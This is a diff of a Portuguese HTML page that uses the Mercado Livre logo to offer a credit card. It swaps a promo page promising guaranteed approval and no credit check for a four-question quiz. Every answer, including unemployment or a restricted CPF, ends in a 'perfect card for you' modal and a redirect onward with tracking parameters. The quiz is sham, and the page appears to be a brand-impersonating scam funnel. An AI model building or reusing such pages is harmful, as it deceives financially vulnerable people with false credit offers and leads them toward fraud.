@@ -1,123 +1,69 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-   <!-- Google tag (gtag.js) -->
-<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-CV5GQ7D48S"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-CV5GQ7D48S');
-</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/all.min.css">
-    <title>Cartão Mercado Livre</title>
+    <title>Cartão</title>
 
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
     <style>
         body {
             margin: 0;
-            font-family: 'Sora', sans-serif;
-            background-color: #fff159;
-            color: #333;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            color: white;
             text-align: center;
         }
         .header {
             display: flex;
             align-items: center;
-            padding: 5px;
-            border-bottom: 1.5px solid #e6d950;
-            background-color: #fff159;
+            padding: 10px;
+            border-bottom: 1px solid #aa9900;
+            background-color: #FFE600;
         }
         .header img {
             width: 125px;
             padding: 10px;
         }
         .logo {
-            margin-left: auto;
-            margin-right: auto;
+            margin-left: 20px;
         }
         .content {
             padding: 20px;
         }
-        h1 {
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
-        .button {
-            background-color: #3483fa;
-            font-family: 'Sora', sans-serif;
-            color: #ffffff;
-            padding: 20px 20px;
-            border-radius: 10px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 18px;
-            display: block;
-            margin: 20px auto;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            transition: all 0.3s ease;
-            max-width: 350px;
-            position: relative;
-            animation: pulse 2s infinite;
-            margin-top: 30px;
-        }
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(52, 131, 250, 0.7);
-            }
-            70% {
-                box-shadow: 0 0 0 10px rgba(52, 131, 250, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(52, 131, 250, 0);
-            }
-        }
-
-        @keyframes pulseazul {
-            0% {
-                box-shadow: 0 0 0 0 rgba(52, 131, 250, 0.7);
-            }
-            70% {
-                box-shadow: 0 0 0 10px rgba(52, 131, 250, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(52, 131, 250, 0);
-            }
-        }
-
-        .button:hover {
-            background-color: #2968c8;
-        }
-        .benefits-section {
-            background-color: #dbd7af;
+        .quiz-container {
+            margin: 0 auto;
             padding: 20px;
+            margin: 0px 15px;
             border-radius: 10px;
-            margin: 20px auto;
-            max-width: 300px;
+            background-color: #ffffff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-top: 20px;
         }
-        .benefit-item {
-            background-color: #fff;
-            color: #333;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 10px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .quiz-question {
+            font-family: 'Sora', sans-serif;
+            font-size: 20px;
+            text-align: left;
+            margin-bottom: 20px;
+            margin-top: 0px;
+            color: #1c1c1c;
         }
-        .benefit-item h3 {
-            color: #3483fa;
-            margin: 0;
-            font-size: 14px;
+        .quiz-option {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px;
+            margin: 5px 0;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            font-family: 'Sora', sans-serif;
+            border: none;
+            width: 100%;
+            font-size: 16px;
         }
-        .benefit-item i {
-            margin-right: 5px;
+        .quiz-option:hover {
+            background-color: #e6cf00;
         }
     </style>
 </head>
@@ -125,115 +71,65 @@
     <div class="header">
         <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
     </div>
-    <div class="content">
-        <div style="margin-top: 30px; background-color: rgba(174, 159, 0, 0.15); color: #FFE600; padding: 15px 5px; border-radius: 20px; display: flex; align-items: center; justify-content: center; max-width: 300px; margin: 0 auto;">
-            <p style="margin: 0; font-size: 15px; color: #000000;"><i class="fas fa-shield-alt" style="margin-right: 5px; color: #000000;"></i> Sem consulta ao SPC/Serasa</p>
+
+    <div class="quiz-container" id="quiz1" style="display: flex; flex-wrap: wrap; justify-content: center;">
+        <h2 class="quiz-question" style="width: 100%; text-align: center;">O que é mais importante para você em um cartão de crédito?</h2>
+        
+        <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+            <i class="fas fa-money-bill-wave" style="font-size: 30px; color: #FFE600;"></i>
+            <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Limite alto</p>
         </div>
-        <h1 style="font-size: 20px; margin-top: 20px;">Cartão Mercado Livre com limite pré-aprovado de até R$ 6.000 e zero anuidade!</h1>
-        <a class="button" style="margin-top: 20px;">
-            QUERO SOLICITAR MEU CARTÃO!
-        </a>
-        <img src="images/app.webp" alt="Aplicativo Mercado Livre" style="max-width: 100%; border-radius: 10px; margin-top: 10px;">
-        <p style="margin-bottom: 20px;">
-            Processo 100% digital, sem burocracia e sem precisar sair de casa.
-        </p>
-        <div class="benefits-section" style="background-color: rgba(174, 159, 0, 0.15);">
-            <div class="benefits-box">
-                <div class="benefit-item">
-                    <h3><i class="fas fa-shield-alt"></i> Site Seguro</h3>
-                </div>
-                <div class="benefit-item">
-                    <h3><i class="fas fa-lock"></i> Dados Protegidos</h3>
-                </div>
-                <div class="benefit-item" style="margin-bottom: 0px;">
-                    <h3><i class="fas fa-thumbs-up"></i> Aprovação Garantida</h3>
-                </div>
-            </div>
+        <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+            <i class="fas fa-rocket" style="font-size: 30px; color: #FFE600;"></i>
+            <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Crédito imediato</p>
         </div>
-        <a class="button">
-            QUERO SOLICITAR MEU CARTÃO!
-        </a>
-    </div>
-
-    <div style="padding: 0 20px; background-color: #fff;">
-        <div style="margin-top: 20px;">
-            <h2 style="font-size: 24px; color: #333; margin-bottom: 30px; padding-top: 40px;">Como funciona?</h2>
-            <div style="display: flex; flex-direction: column; gap: 20px; max-width: 400px; margin: 0 auto;">
-                <div style="background-color: #f8f9fa; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 1.5px solid #e9ecef;">
-                    <div style="background-color: #3483fa; color: white; width: 25px; height: 25px; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: absolute; top: -12px; left: 50%; transform: translateX(-50%);">1</div>
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-clipboard-list" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #333; font-size: 18px; margin: 0 0 5px 0;">Responda o Quiz</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Apenas 4 perguntas rápidas para analisarmos seu perfil</p>
-                </div>
-
-                <div style="margin-top: 20px;background-color: #f8f9fa; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 1.5px solid #e9ecef;">
-                    <div style="background-color: #3483fa; color: white; width: 25px; height: 25px; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: absolute; top: -12px; left: 50%; transform: translateX(-50%);">2</div>
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-bolt" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #333; font-size: 18px; margin: 0 0 5px 0;">Análise Instantânea</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Resultado em segundos, sem consulta ao SPC/Serasa</p>
-                </div>
-
-                <div style="margin-top: 20px; background-color: #f8f9fa; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 1.5px solid #e9ecef;">
-                    <div style="background-color: #3483fa; color: white; width: 25px; height: 25px; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: absolute; top: -12px; left: 50%; transform: translateX(-50%);">3</div>
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-credit-card" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #333; font-size: 18px; margin: 0 0 5px 0;">Receba seu Cartão</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Cartão virtual na hora e físico em até 7 dias úteis</p>
-                </div>
-            </div>
-
-            <a class="button" style="background-color: #3483fa; color: #fff; animation: pulseazul 2s infinite;">
-                QUERO SOLICITAR MEU CARTÃO!
-            </a>
-
-            <div style="padding-top: 30px;"></div>
+        <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+            <i class="fas fa-ban" style="font-size: 30px; color: #FFE600;"></i>
+            <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Não consultar SPC/Serasa</p>
+        </div>
+        <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+            <i class="fas fa-calendar-alt" style="font-size: 30px; color: #FFE600;"></i>
+            <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Sem anuidade</p>
         </div>
     </div>
+    
+    <div class="quiz-container" id="quiz2" style="display: none;">
+        <h2 class="quiz-question">Em qual grupo você se encaixa?</h2>
+        
+        <button class="quiz-option" onclick="showQuiz3()">Empreendedor</button>
+        <button class="quiz-option" onclick="showQuiz3()">Carteira assinada</button>
+        <button class="quiz-option" onclick="showQuiz3()">Desempregado</button>
+        <button class="quiz-option" onclick="showQuiz3()">Aposentado</button>
+        <button class="quiz-option" onclick="showQuiz3()">Servidor público</button>
+        <button class="quiz-option" onclick="showQuiz3()">Estudante</button>
+        <button class="quiz-option" onclick="showQuiz3()">Autônomo</button>
+    </div>
 
-    <div style="padding: 0 20px; background-color: #fff159;">
-        <div style="margin-top: 20px;">
-            <h2 style="font-size: 24px; color: #333; margin-bottom: 30px; padding-top: 40px;">Benefícios Exclusivos</h2>
-            <div style="display: flex; flex-direction: column; gap: 20px; max-width: 400px; margin: 0 auto;">
-                <div style="background-color: #fff; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 2px solid #3483fa;">
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-dollar-sign" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #3483fa; font-size: 18px; margin: 0 0 5px 0;">Zero Anuidade</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Economize mais de R$ 500 por ano em anuidades</p>
-                </div>
+    <div class="quiz-container" id="quiz3" style="display: none;">
+        <h2 class="quiz-question">Qual sua renda mensal?</h2>
+        
+        <button class="quiz-option" onclick="showQuiz4()">Até R$ 1.000</button>
+        <button class="quiz-option" onclick="showQuiz4()">Entre R$ 1.000 e R$ 2.000</button>
+        <button class="quiz-option" onclick="showQuiz4()">Entre R$ 2.000 e R$ 4.000</button>
+        <button class="quiz-option" onclick="showQuiz4()">Acima de R$ 4.000</button>
+    </div>
 
-                <div style="background-color: #fff; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 2px solid #3483fa;">
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-chart-line" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #3483fa; font-size: 18px; margin: 0 0 5px 0;">Limite Flexível</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Aumente seu limite conforme usa o cartão</p>
-                </div>
+    <div class="quiz-container" id="quiz4" style="display: none;">
+        <h2 class="quiz-question">Você tem restrições no CPF?</h2>
+        
+        <button class="quiz-option" onclick="showModal()">Sim</button>
+        <button class="quiz-option" onclick="showModal()">Não</button>
+    </div>
 
-                <div style="background-color: #fff; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 2px solid #3483fa;">
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-undo" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #3483fa; font-size: 18px; margin: 0 0 5px 0;">Cashback Garantido</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Receba até 5% de volta em todas as suas compras</p>
-                </div>
-
-                <div style="background-color: #fff; padding: 25px 20px 20px; border-radius: 10px; text-align: center; position: relative; border: 2px solid #3483fa;">
-                    <div style="margin-bottom: 10px;">
-                        <i class="fas fa-gift" style="font-size: 24px; color: #3483fa; padding-top: 10px;"></i>
-                    </div>
-                    <h3 style="color: #3483fa; font-size: 18px; margin: 0 0 5px 0;">Benefícios Exclusivos</h3>
-                    <p style="color: #666; font-size: 14px; margin: 0;">Descontos especiais em lojas parceiras</p>
-                </div>
+    <div id="modalOverlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); z-index: 998;"></div>
+    <div id="successModal" class="modal" style="display: none; position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 90%; height: 100%; justify-content: center; align-items: center; z-index: 999;">
+        <div style="background: white; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 400px; position: relative;">
+            <div style="width: 60px; height: 60px; background: #e6fff0; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px;">
+                <i class="fas fa-check" style="color: #00c853; font-size: 30px;"></i>
             </div>
-            <a class="button" style="background-color: #3483fa; color: #fff; margin-top: 30px; margin-bottom: 40px;">
-                QUERO SOLICITAR MEU CARTÃO!
-            </a>
+            <h2 style="font-family: 'Sora', sans-serif; color: #1c1c1c; font-size: 24px; text-align: center; margin-bottom: 20px;">Temos um cartão perfeito para você!</h2>
+            <p style="font-family: 'Sora', sans-serif; text-align: center; font-size: 16px; color: #666; margin-bottom: 30px;">Descubra seu novo limite em 30 segundos e receba seu cartão ainda <strong>hoje</strong>!</p>
+            <a class="button" href="/2/#" style="font-family: \" sora\',="" sans-serif;="" background:="" #ffe600;="" color:="" #1c1c1c;="" padding:="" 15px="" 30px;="" border-radius:="" 25px;="" text-decoration:="" none;="" display:="" inline-block;="" font-weight:="" bold;="" font-size:="" 16px;'="">Continuar</a>
         </div>
     </div>
 
@@ -251,53 +147,66 @@
         </div>
     </footer>
 
-    <script>
-        // Função para obter parâmetros da URL
-        function getUrlParams() {
-            const params = {};
-            const queryString = window.location.search;
-            const urlParams = new URLSearchParams(queryString);
-            
-            for (const [key, value] of urlParams) {
-                params[key] = value;
-            }
-            return params;
-        }
-    
-        // Função para construir URL com parâmetros
-        function buildUrlWithParams(baseUrl) {
-            const params = getUrlParams();
-            const url = new URL(baseUrl, window.location.href);
-            
-            Object.keys(params).forEach(key => {
-                url.searchParams.append(key, params[key]);
-            });
-            
-            return url.toString();
-        }
+<script>
+    function showQuiz2() {
+        document.getElementById('quiz1').style.display = 'none';
+        document.getElementById('quiz2').style.display = 'block';
+    }
 
-        // Função para salvar UTMs no localStorage
-        function saveUtmParams() {
-            const params = getUrlParams();
-            localStorage.setItem('urlParams', JSON.stringify(params));
-            console.log('UTMs salvos:', params);
+    function showQuiz3() {
+        document.getElementById('quiz2').style.display = 'none';
+        document.getElementById('quiz3').style.display = 'block';
+    }
+
+    function showQuiz4() {
+        document.getElementById('quiz3').style.display = 'none';
+        document.getElementById('quiz4').style.display = 'block';
+    }
+
+    function showModal() {
+        document.getElementById('quiz4').style.display = 'none';
+        document.getElementById('modalOverlay').style.display = 'block';
+        const modal = document.getElementById('successModal');
+        modal.style.display = 'flex';
+    }
+</script>
+
+<script>
+    // Função para obter parâmetros da URL
+    function getUrlParams() {
+        const params = {};
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        
+        for (const [key, value] of urlParams) {
+            params[key] = value;
         }
-    
-        // Adiciona evento de clique em todos os botões
-        document.addEventListener('DOMContentLoaded', function() {
-            // Salvar UTMs ao carregar a página
-            saveUtmParams();
-            
-            const buttons = document.querySelectorAll('.button');
-            buttons.forEach(button => {
-                button.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    window.location.href = buildUrlWithParams('../2/index.html');
-                });
+        return params;
+    }
+
+    // Função para construir URL com parâmetros
+    function buildUrlWithParams(baseUrl) {
+        const params = getUrlParams();
+        const url = new URL(baseUrl, window.location.href);
+        
+        Object.keys(params).forEach(key => {
+            url.searchParams.append(key, params[key]);
+        });
+        
+        return url.toString();
+    }
+
+    // Adiciona evento de clique em todos os botões
+    document.addEventListener('DOMContentLoaded', function() {
+        const buttons = document.querySelectorAll('.button');
+        buttons.forEach(button => {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = buildUrlWithParams('../3/index.html');
             });
         });
-    </script>
-    
+    });
+</script>
 
 
 </body></html>
